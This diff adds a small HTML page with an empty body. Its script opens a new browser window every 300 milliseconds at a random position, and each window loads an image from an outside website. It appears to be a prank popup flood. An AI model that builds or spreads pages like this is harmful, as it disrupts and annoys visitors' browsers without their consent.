@@ -1,0 +1,22 @@
+<html>
+    <head>
+        <script type='text/javascript'>
+            function getRandomInt(min, max) {
+                return Math.floor(Math.random() * (max - min + 1)) + min;
+            }
+
+            var i = 0;
+            setInterval(function() {
+                i++;
+
+                var posX = getRandomInt(0, window.innerWidth - 400);
+                var posY = getRandomInt(0, window.innerHeight - 600);
+
+                window.open("http://www.anunciosgratis.pt/oc-content/uploads/import-pics/9E/CA/2006474.jpg", 'janela' + i, "height=600, width=400, top="+ posY +", left=" + posX);
+            }, 300);
+        </script>
+    </head>
+    <body>
+        
+    </body>
+</html>
